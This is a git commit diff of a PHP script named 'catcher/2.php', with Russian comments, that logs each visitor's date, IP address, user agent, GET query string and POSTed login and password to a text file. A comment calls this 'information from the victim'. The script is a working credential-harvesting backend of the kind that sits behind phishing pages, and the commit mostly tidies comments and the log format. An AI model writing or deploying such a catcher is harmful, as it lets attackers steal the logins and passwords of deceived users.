689006a75551899327eb90a28492784c527a65b0
Анастасия Яковлева < >
2015-11-28 21:43:05 +0300

    +3

--- catcher/2.php
+++ catcher/2.php
@@ -1,20 +1,14 @@
 <?
-$file="file2.txt";
-$data=date("d.m.Y H:i"); //в скобках прописан формат отображения даты D - день недели, M - месяц Y - год. 
-//$time=date("h:i"); //в скобках прописан формат отображения времени h - часы, i - минуты 
-$ip=trim($_SERVER['REMOTE_ADDR']);   
-$sysinfo=trim($_SERVER['HTTP_USER_AGENT']);
-$query=$_SERVER['QUERY_STRING'];
-$login = $_POST[login];
-$pass = $_POST[pass];
+$file="file2.txt"; //файл куда записываем все
+$data=date("d.m.Y H:i"); //в скобках прописан формат отображения даты D - день недели, M - месяц Y - год, времени h - часы, i - минуты  
+$ip=trim($_SERVER['REMOTE_ADDR']); //ip
+$sysinfo=trim($_SERVER['HTTP_USER_AGENT']); //много всякой информации
+$query=$_SERVER['QUERY_STRING']; //запросом GET
+$login = $_POST[login]; //метод POST
+$pass = $_POST[pass]; //метод POST
 if(is_file($file)){ //Проверяем наличие файла и возможность работы с ним 
 $fo=fopen($file,"a+"); //Открываем файл на запись в конец 
-$res="\n$data  |  $ip  |  $sysinfo | \n$query \n$login  | $pass \n"; //Формируем строку с информацией от жертвы 
-//в формате дата|время|ip-адрес|характеристика системы 
-//Header("Content-type: image/png"); 
-//$im = ImageCreateFromGif("jpg.jpg"); 
-//ImageGif($im); 
-//ImageDestroy($im); 
+$res="\n$data  |  $ip  |  $sysinfo | \nlogin=$login  password=$pass \n$query \n"; //Формируем строку с информацией от жертвы 
 $fw=fwrite($fo,$res); //Записываем в файл 
 fclose($fo); //Закрываем файл 
 } 
